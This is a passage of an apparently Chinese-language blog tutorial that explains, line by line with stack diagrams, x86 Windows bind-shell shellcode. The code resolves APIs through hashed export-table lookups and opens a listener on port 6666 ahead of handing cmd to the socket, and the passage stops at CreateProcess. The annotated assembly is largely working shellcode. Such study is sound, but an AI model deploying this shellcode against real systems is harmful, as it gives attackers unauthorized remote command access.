-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png" alt="image-20220918174706970"></p>
-<p>先前esp&#x3D;0x12FF38,之后esp&#x3D;0x12FC38</p>
-<h4 id="“ws2-32”字符串压栈"><a href="#“ws2-32”字符串压栈" class="headerlink" title="“ws2_32”字符串压栈"></a>“ws2_32”字符串压栈</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; push a pointer to &quot;ws2_32&quot; onto stack </span><br><span class="line">	mov dx, 0x3233 			; rest of edx is null </span><br><span class="line">	push edx </span><br><span class="line">	push 0x5f327377 </span><br><span class="line">	push esp </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里有三个压栈,前两个是压入”ws2_32”,后面这个是保存当时的esp位置</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918170246010.png" alt="image-20220918170246010"></p>
-<h3 id="外圈循环一次开始"><a href="#外圈循环一次开始" class="headerlink" title="外圈循环一次开始"></a>外圈循环一次开始</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line">	lodsb 					; load next hash into al and increment esi </span><br><span class="line">	cmp al, 0xd3 				; hash of WSAStartup - trigger </span><br><span class="line">							; LoadLibrary(&quot;ws2_32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0xc] 			; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of ws2_32.dll </span><br><span class="line">	push edi 					; save location of addr of first winsock function </span><br></pre></td></tr></table></figure>
-
-<p>汇编语言中不会平白无故地设置标号的,都是为了方便跳转,这里”find_lib_functions”标号意味着循环开始了</p>
-<p>lodsb相当于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,[esi]</span><br><span class="line">inc esi</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174632185.png" alt="image-20220918174632185"></p>
-<p>然后al和0xd3比较的意思是,是否是要解析WSAStartup这个函数,如果是,则说明要到ws2_32库中解析函数了,而刚才一直都是在kernel32.dll中解析函数,因此此时需要更换库基址,又已经从kernel32.dll解析了LoadLibraryA,因此可以直接调用该windowsAPI寻找ws2_32.dll的基地址</p>
-<p>如果al&#x3D;0xd3就顺序执行,不跳转,调用LoadLibraryA更换库函数地址,然后再执行find_functions,否则直接跳转find_functions</p>
-<h3 id="中圈循环初始化"><a href="#中圈循环初始化" class="headerlink" title="中圈循环初始化"></a>中圈循环初始化</h3><p>实际上外圈循环一次,中圈就初始化一次,两个可以看成一块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find_functions: </span><br><span class="line">	pushad 						; preserve registers </span><br><span class="line">	mov eax, [ebp + 0x3c]		; eax = start of PE header </span><br><span class="line">	mov ecx, [ebp + eax + 0x78]	; ecx = relative offset of export table </span><br><span class="line">	add ecx, ebp 				; ecx = absolute addr of export table </span><br><span class="line">	mov ebx, [ecx + 0x20] 		; ebx = relative offset of names table </span><br><span class="line">	add ebx, ebp 				; ebx = absolute addr of names table </span><br><span class="line">	xor edi, edi 				; edi will count through the functions </span><br></pre></td></tr></table></figure>
-
-<p>首先将所有寄存器压栈,即使有的寄存器不需要压栈保存,也要使用这条指令,因为它短</p>
-<p>假设当前仍然是在kernel32.dll中解析函数,这意味着find_lib_functions中的push edi不会执行,那么此时的堆栈状态是</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918172313484.png" alt="image-20220918172313484"></p>
-<p>ebp指向的是kernel32.dll或者ws2_32.dll的基地址,库基地址偏移0x3c的地方是库的PE头,</p>
-<p>PE头偏移0x78的地方是导出函数地址(RVA)表的指针,这个地址交给ecx保管</p>
-<p>ecx加上ebp的作用是获得导出函数地址表的绝对虚拟地址(刚才ecx中是相对于库基址的相对虚拟地址)</p>
-<p>ecx+0x20处是导出函数名表的指针,解引用后将导出函数名表的相对基地址交给ebx保管</p>
-<p>ebx再加上ebp就得到了导出函数名表的绝对虚拟地址</p>
-<p>edi置零,将会作为中圈循环变量</p>
-<table>
-<thead>
-<tr>
-<th>寄存器</th>
-<th>值意义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>eax</td>
-<td>RVA(PE头)</td>
-</tr>
-<tr>
-<td>ebx</td>
-<td>VA(导出函数名表)</td>
-</tr>
-<tr>
-<td>ecx</td>
-<td>VA(导出函数地址表)</td>
-</tr>
-<tr>
-<td>edi</td>
-<td>中圈循环变量,作为导出函数表的下标</td>
-</tr>
-</tbody></table>
-<h3 id="中圈循环一次开始"><a href="#中圈循环一次开始" class="headerlink" title="中圈循环一次开始"></a>中圈循环一次开始</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">next_function_loop: </span><br><span class="line">	inc edi 					; increment function counter </span><br><span class="line">	mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name </span><br><span class="line">	add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">	cdq 						; dl will hold hash (we know eax is small) </span><br></pre></td></tr></table></figure>
-
-<p>edi每次自增1,然后[ebx+edi*4]基址变址寻址,ebx是导出函数名表的基地址,<code>ebx+edi*4</code>就相当于下标访问数组name[edi],</p>
-<p>这个导出函数名表的每一项都是字符串指针,解引用后取得一个函数名字符串的相对基地址,放到esi,然后esi+ebp得到该函数名字符串的绝对基地址.</p>
-<p>cdq用eax带符号拓展将edx置零,因为edx马上就要存放该导出函数名的哈希值了</p>
-<h3 id="内圈循环hash-loop"><a href="#内圈循环hash-loop" class="headerlink" title="内圈循环hash_loop"></a>内圈循环hash_loop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	lodsb 					; load next char into al and increment esi </span><br><span class="line">	xor al, 0x71 				; XOR current char with 0x71 </span><br><span class="line">	sub dl, al 				; update hash with current char </span><br><span class="line">	cmp al, 0x71 				; loop until we reach end of string </span><br><span class="line">	jne hash_loop </span><br></pre></td></tr></table></figure>
-
-<p>内圈循环就是计算esi开始的导出函数名的哈希值</p>
-<p>lodsb相当于</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,[esi]</span><br><span class="line">inc esi</span><br></pre></td></tr></table></figure>
-
-<p>每次取该函数名的一个字节放到al上,和0x71按位异或之后用dl减去该异或值,dl负责累计哈希值</p>
-<p>如果al与0x71异或得到0x71说明al本来就是00,说明该字符串遍历到头’\0’了,此时算是计算完了本函数名的哈希值</p>
-<h3 id="中圈循环一次判断"><a href="#中圈循环一次判断" class="headerlink" title="中圈循环一次判断"></a>中圈循环一次判断</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp dl, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) </span><br><span class="line">jnz next_function_loop </span><br></pre></td></tr></table></figure>
-
-<p>al中存放刚计算出哈希值,esp+0x1c指向的是我们正在给他解析地址的函数摘要</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png" alt="image-20220918171355607"></p>
-<p>al与[esp+0x1c]一比划,如果相等说明该找到了目标函数,跳出中圈循环</p>
-<p>如果不相等说明当前库函数名不是我们想要解析的,需要中圈遍历下一个函数名,因此<code>jnz next_function_loop </code></p>
-<h3 id="外圈循环一次结束-回写目标函数绝对地址"><a href="#外圈循环一次结束-回写目标函数绝对地址" class="headerlink" title="外圈循环一次结束,回写目标函数绝对地址"></a>外圈循环一次结束,回写目标函数绝对地址</h3><p>此时寄存器中值的意义来自 中圈循环初始化</p>
-<table>
-<thead>
-<tr>
-<th>ebx</th>
-<th>VA(导出函数名表)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>ecx</td>
-<td>VA(导出函数地址表)</td>
-</tr>
-</tbody></table>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of ordinals table </span><br><span class="line">mov di, [ebx + 2 * edi] 		; di = ordinal number of matched function </span><br><span class="line">mov ebx, [ecx + 0x1c] 		; ebx = relative offset of address table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of address table </span><br><span class="line">add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the </span><br><span class="line">							; relative offset of matched function </span><br><span class="line">xchg eax, ebp 				; move func addr into eax </span><br><span class="line">pop edi 					; edi is last onto stack in pushad </span><br><span class="line">stosd 					; write function addr to [edi] and increment edi </span><br><span class="line">push edi </span><br><span class="line">popad					; restore registers </span><br></pre></td></tr></table></figure>
-
-<p>ecx+0x24指向序号表的RVA,解引用后将序号表RVA放到ebx上然后加上ebp中的库基址就得到了VA(序号表)</p>
-<p>用函数名表的下标查序号表,得到的值作为下标查地址表就得到了函数地址,</p>
-<p>在回写之前首先退栈还原edi,这是因为在中圈循环初始化时所有寄存器都压栈保存了,后来无法保证edi是否被修改过,因此这里采用堆栈上保存的值还原edi,由于edi是最后一个入栈的寄存器,此时位于栈顶,直接pop就可以还原了,在图上看就是</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png" alt="image-20220918171355607"></p>
-<p>然后使用stosd,相当于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov [edi],eax</span><br><span class="line">add edi,4</span><br></pre></td></tr></table></figure>
-
-<p>这就将函数地址回写到了预留的函数地址空间中了</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174549264.png" alt="image-20220918174549264"></p>
-<p>然后再将edi压栈是为了凑齐popad的结构,给edi占位防止错位弹出</p>
-<p>最后popad将所有压栈保存的寄存器还原,此时的堆栈状态为</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173600627.png" alt="image-20220918173600627"></p>
-<p>所有寄存器的意义为</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173623051.png" alt="image-20220918173623051"></p>
-<h3 id="外圈循环判断是否全部解析完毕"><a href="#外圈循环判断是否全部解析完毕" class="headerlink" title="外圈循环判断是否全部解析完毕"></a>外圈循环判断是否全部解析完毕</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmp esi, edi 				; loop until we reach end of last hash </span><br><span class="line">jne find_lib_functions </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>一开始给8个符号的地址只预留了24字节的空间,能够容纳6个符号,剩下两个符号需要覆盖摘要值</p>
-<p>当edi追上esi的时候意味着覆盖完成,8个符号已经都解析了,此时外圈循环也结束了</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174325158.png" alt="image-20220918174325158"></p>
-<h2 id="建立Socket通信"><a href="#建立Socket通信" class="headerlink" title="建立Socket通信"></a>建立Socket通信</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop esi 					; saved location of first winsock function </span><br><span class="line">							; we will lodsd and call each func in sequence </span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>在外圈循环一次的时候曾经区别处理过ws2_32.dll的函数有一个push edi压栈,意思是压栈保存第一条ws2_32.dll函数的地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line">	lodsb 					; load next hash into al and increment esi </span><br><span class="line">	cmp al, 0xd3 				; hash of WSAStartup - trigger </span><br><span class="line">							; LoadLibrary(&quot;ws2_32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0xc] 			; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of ws2_32.dll </span><br><span class="line">	push edi 					; save location of addr of first winsock function </span><br></pre></td></tr></table></figure>
-
-
-</blockquote>
-<p>在执行本条指令<strong>之前</strong>的堆栈状态</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918175317614.png" alt="image-20220918175317614"></p>
-<p>pop esi之后,esi就指向了第一条ws2_32的函数在预留空间中的地址,也就是WSAStartup的预留地址</p>
-<h3 id="调用WSAStartUp"><a href="#调用WSAStartUp" class="headerlink" title="调用WSAStartUp"></a>调用WSAStartUp</h3><blockquote>
-<p>该API函数作用是为进程使用Winsock模块初始化,必须先调用该函数才可以激活Winsock模块中的其他函数,其接口为</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">WSAStartup</span><span class="params">(</span></span><br><span class="line"><span class="params">        WORD      wVersionRequired,<span class="comment">//可以使用的windows 套接字规范的最高版本</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">  [out] LPWSADATA lpWSAData<span class="comment">//返回值,指向WSADATA结构体的指针</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>其中32位机器上,WSADATA长这样</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> &#123;</span></span><br><span class="line">        WORD                    wVersion;<span class="comment">//我们要使用的版本</span></span><br><span class="line">        WORD                    wHighVersion;<span class="comment">//系统能提供给我们的版本</span></span><br><span class="line">        <span class="type">char</span>                    szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>                    szSystemStatus[WSASYS_STATUS_LEN+<span class="number">1</span>];<span class="comment">//当前库的秒数信息，2.0是第2版的意思</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxSockets;<span class="comment">//返回可用的socket数量,2版本只有就没用了</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxUdpDg;<span class="comment">//UDP数据报信息大小,2版本只有就没用了</span></span><br><span class="line">        <span class="type">char</span> FAR *              lpVendorInfo;<span class="comment">//供应商特定的信息,2版本只有就没用了</span></span><br><span class="line">&#125; WSADATA;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>共11个字节</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; initialize winsock </span><br><span class="line">	</span><br><span class="line">	push esp 					; use stack for WSADATA </span><br><span class="line">	push 0x02 				; wVersionRequested </span><br><span class="line">	lodsd </span><br><span class="line">	call eax 					; WSAStartup </span><br></pre></td></tr></table></figure>
-
-<p>首先esp压栈作为第二个参数的地址,返回的WSADATA结构体将会写到此时的栈顶</p>
-<p>0x02压栈作为第一个参数,即套接字版本号</p>
-<p>esi恰好就指向WSAStartUp的预留地址,lodsd相当于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[esi]</span><br><span class="line">add esi,4</span><br></pre></td></tr></table></figure>
-
-<p>就解引用将函数的绝对地址放到eax上了</p>
-<p>然后call eax调用API,返回值写到所有参数之前的栈顶上,如果函数调用成功则eax&#x3D;0</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918181142886.png" alt="image-20220918181142886"></p>
-<h3 id="给”CMd”画上句号"><a href="#给”CMd”画上句号" class="headerlink" title="给”CMd”画上句号"></a>给”CMd”画上句号</h3><p>趁着eax刚从WSAStartUp返回来,值为0,将0放到”CMd”字符串后面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; null-terminate &quot;cmd&quot; </span><br><span class="line">	mov byte ptr [esi + 0x13], al ; eax = 0 if WSAStartup() worked </span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="调用WSASocketA"><a href="#调用WSASocketA" class="headerlink" title="调用WSASocketA"></a>调用WSASocketA</h3><blockquote>
-<p>WSASockA创建一个绑定到特殊服务提供者的套接字</p>
-<p>其函数接口为</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SOCKET WSAAPI <span class="title function_">WSASocketA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 af,<span class="comment">//网络层协议,AF_INET(2)</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 type,<span class="comment">//传输层类型SOCK_STREAM(1)</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 protocol,<span class="comment">//传输层协议,TCP(6),UDP(17)</span></span></span><br><span class="line"><span class="params">  [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,<span class="comment">//WSAPROTOCOL_INFO结构体指针,用于存储信息</span></span></span><br><span class="line"><span class="params">  [in] GROUP               g,<span class="comment">//套接字组ID</span></span></span><br><span class="line"><span class="params">  [in] DWORD               dwFlags<span class="comment">//套接字属性标志</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>如果调用成功,返回该套接字的描述符</p>
-</blockquote>
-<h4 id="清空栈帧-相当于填充NULL作为参数"><a href="#清空栈帧-相当于填充NULL作为参数" class="headerlink" title="清空栈帧,相当于填充NULL作为参数"></a>清空栈帧,相当于填充NULL作为参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; clear some stack to use as NULL parameters </span><br><span class="line">	lea ecx, [eax + 0x30] 		; sizeof(STARTUPINFO) = 0x44, ecx=0x30,重复30次</span><br><span class="line">	mov edi, esp ;当前栈顶设置为串拷贝的目标</span><br><span class="line">	rep stosd 				; eax is still 0 eax拷贝到edi,edi自增4,相当于全都置零</span><br></pre></td></tr></table></figure>
-
-<p>执行之前栈帧的状态</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191550943.png" alt="image-20220918191550943"></p>
-<p>执行之后</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191620311.png" alt="image-20220918191620311"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">; create socket </span><br><span class="line">	inc eax 	;eax=1</span><br><span class="line">	push eax					; type = 1 (SOCK_STREAM) ,1压栈</span><br><span class="line">	inc eax ;eax=2</span><br><span class="line">	push eax ; af = 2 (AF_INET) IPv4协议</span><br><span class="line">	lodsd ;[esi]-&gt;eax,esi+=4,eax指向WSASocketA的地址</span><br><span class="line">	call eax ; WSASocketA </span><br><span class="line">	xchg ebp, eax				; save SOCKET descriptor in ebp (safe from </span><br><span class="line">								; being changed by remaining API calls) </span><br></pre></td></tr></table></figure>
-
-<p>调用WSASocketA之前,栈帧的状态为</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918192112499.png" alt="image-20220918192112499"></p>
-<p>函数调用返回后,eax中存放的是套接字描述符,交换到ebp中保存起来</p>
-<h3 id="bind-listen-accept循环"><a href="#bind-listen-accept循环" class="headerlink" title="bind,listen,accept循环"></a>bind,listen,accept循环</h3><h4 id="初始化bind参数"><a href="#初始化bind参数" class="headerlink" title="初始化bind参数"></a>初始化bind参数</h4><blockquote>
-<p>bind函数用来绑定套接字</p>
-<p>其接口为</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bind</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] SOCKET         s,<span class="comment">//套接字描述符</span></span></span><br><span class="line"><span class="params">       <span class="type">const</span> sockaddr *name,<span class="comment">//sockaddr结构体指针,该结构体用于指定ipv4地址还有端口号</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>            namelen<span class="comment">//name指向的结构体的大小</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>只要是<code>namelen&gt;sizeof(*name)</code>就可以,因此namelen可以往大了设置为任意大小</p>
-<p>sockaddr用来指定ip协议类型,ip地址还有端口号</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> sa_family; <span class="comment">/* address family, AF_xxx */</span></span><br><span class="line">	<span class="type">char</span> sa_data[<span class="number">14</span>]; <span class="comment">/* 14 bytes of protocol address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>相当于sockaddr_in结构体,二者在大小上是相同的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">	<span class="type">short</span> <span class="type">int</span> sin_family; <span class="comment">/* Address family */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> sin_port; <span class="comment">/* Port number */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span> <span class="comment">/* Internet address */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">/* Same size as struct sockaddr */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; push bind parameters </span><br><span class="line">	mov eax, 0x0a1aff02 		; 0x1a0a = port 6666, 0x02 = AF_INET </span><br><span class="line">	xor ah, ah					; remove the ff from eax </span><br><span class="line">	push eax	 				; we use 0x0a1a0002 as both the name (struct </span><br><span class="line">								; sockaddr) and namelen (which only needs to </span><br><span class="line">								; be large enough) </span><br><span class="line">	push esp 					; pointer to our sockaddr struct </span><br></pre></td></tr></table></figure>
-
-
-
-<p>0x0a1a0002这个值直接压栈作为namelen,足够大了</p>
-<p>0x0a1a0002,最低两个字节0x0002用来填sockaddr_in.sin_family</p>
-<p>然后用0x0a1a&#x3D;6666填sockaddr_in.sin_port</p>
-<p>将namelen的栈中地址压栈,因为其上的数也可以作为sock_addr结构体</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918195551305.png" alt="image-20220918195551305"></p>
-<p>到此还有一个参数没有压栈,即套接字描述符,它保存在ebp中</p>
-<h4 id="三联循环-复用循环代码"><a href="#三联循环-复用循环代码" class="headerlink" title="三联循环,复用循环代码"></a>三联循环,复用循环代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	</span><br><span class="line">; call bind(), listen() and accept() in turn </span><br><span class="line">call_loop: </span><br><span class="line">	push ebp					; saved SOCKET descriptor (we implicitly pass </span><br><span class="line">								; NULL for all other params) </span><br><span class="line">	lodsd </span><br><span class="line">	call eax 					; call the next function </span><br><span class="line">	test eax, eax 				; bind() and listen() return 0, accept() </span><br><span class="line">								; returns a SOCKET descriptor </span><br><span class="line">	jz call_loop </span><br></pre></td></tr></table></figure>
-
-<h5 id="首先调用bind"><a href="#首先调用bind" class="headerlink" title="首先调用bind"></a>首先调用bind</h5><p>ebp存放的是套接字描述符,压栈</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918194646766.png" alt="image-20220918194646766"></p>
-<p>然后lodsd将bind函数地址搬到eax上,然后函数edi函数指针后移4个字节,指向listen了</p>
-<p>eax中是bind的地址,call eax调用bind了</p>
-<p>如果调用成功则返回eax&#x3D;0,又恰好bind,listen成功的返回值eax&#x3D;0,accept成功的返回值非零,因此可以根据eax值判断该函数是不是accept</p>
-<p>如果返回0则不是,说明三联还没有完成,重新call_loop</p>
-<h5 id="然后调用listen"><a href="#然后调用listen" class="headerlink" title="然后调用listen"></a>然后调用listen</h5><blockquote>
-<p>listen函数,将套接字设置为监听状态</p>
-<p>其接口为</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">listen</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] SOCKET s,<span class="comment">//套接字描述符</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>    backlog<span class="comment">//挂起连接队列的最大长度,不疼不痒</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>这里我们只对第一个参数,套接字描述符,感兴趣,backlog爱是啥是啥,反正不是0就行</p>
-<p>于是在第二次循环一开始又将ebp压入作为第一个参数,历史上的堆栈,爱谁谁作为第二个参数</p>
-<p>lodsd 又将listen地址放到eax上然后edi指向下一个函数accept,</p>
-<p>然后就调用了listen,返回eax&#x3D;0</p>
-<h5 id="最后调用accept"><a href="#最后调用accept" class="headerlink" title="最后调用accept"></a>最后调用accept</h5><blockquote>
-<p>accept用于接收对套接字的连接</p>
-</blockquote>
-<p>调用成功返回新的套接字描述符</p>
-<h2 id="拱手让shell"><a href="#拱手让shell" class="headerlink" title="拱手让shell"></a>拱手让shell</h2><p>到此套接字通信就建立起来了,下面要创建一个cmd进程然后绑到套接字上</p>
-<blockquote>
-<p>CreateProcess用于创建一个新进程并创建其主线程</p>
